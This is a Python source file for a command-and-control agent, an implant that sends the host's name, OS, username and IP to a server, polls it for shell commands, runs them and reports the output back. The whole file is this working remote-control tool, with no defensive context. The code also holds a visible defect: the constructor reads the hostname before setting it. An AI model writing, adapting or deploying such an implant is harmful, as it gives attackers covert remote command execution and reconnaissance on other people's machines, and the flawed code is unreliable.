import requests
import time
import os
import platform
import subprocess
import socket
import json
import uuid

class C2Agent:
    def __init__(self, server_url, callback_interval=10):
        self.server_url = server_url
        self.callback_interval = callback_interval
        self.id = self._get_persistent_id()
        self.hostname = socket.gethostname()
        self.os = f"{platform.system()} {platform.release()}"
        self.username = os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'unknown')
        self.ip = self._get_ip()
        self.is_registered = False

    def _get_persistent_id(self):
        # Generate a semi-persistent ID for this machine
        return str(uuid.uuid5(uuid.NAMESPACE_DNS, self.hostname + platform.node()))[:8]

    def _get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def register(self):
        url = f"{self.server_url}/api/register"
        data = {
            "id": self.id,
            "hostname": self.hostname,
            "os": self.os,
            "username": self.username,
            "ip": self.ip
        }
        try:
            resp = requests.post(url, json=data, timeout=10)
            if resp.status_code == 200:
                self.is_registered = True
                print(f"[*] Registered with ID: {self.id}")
                return True
        except Exception as e:
            print(f"[!] Registration failed: {e}")
        return False

    def poll(self):
        url = f"{self.server_url}/api/poll/{self.id}"
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                return resp.json().get("tasks", [])
        except Exception as e:
            print(f"[!] Polling failed: {e}")
        return []

    def execute_task(self, task):
        task_id = task["id"]
        command = task["command"]
        print(f"[*] Executing task {task_id}: {command}")
        
        try:
            # Execute command and capture output
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            output = "[!] Command timed out."
        except Exception as e:
            output = f"[!] Command execution failed: {e}"
            
        self.report_result(task_id, output)

    def report_result(self, task_id, output):
        url = f"{self.server_url}/api/report"
        data = {
            "agent_id": self.id,
            "task_id": task_id,
            "output": output
        }
        try:
            requests.post(url, json=data, timeout=10)
        except Exception as e:
            print(f"[!] Reporting failed: {e}")

    def run(self):
        print(f"[*] Starting agent {self.id}...")
        while not self.is_registered:
            if self.register():
                break
            time.sleep(30) # Retry registration every 30s
            
        while True:
            tasks = self.poll()
            for task in tasks:
                self.execute_task(task)
            
            time.sleep(self.callback_interval)

if __name__ == "__main__":
    # For testing, assume server is local
    agent = C2Agent("http://localhost:5001")
    agent.run()
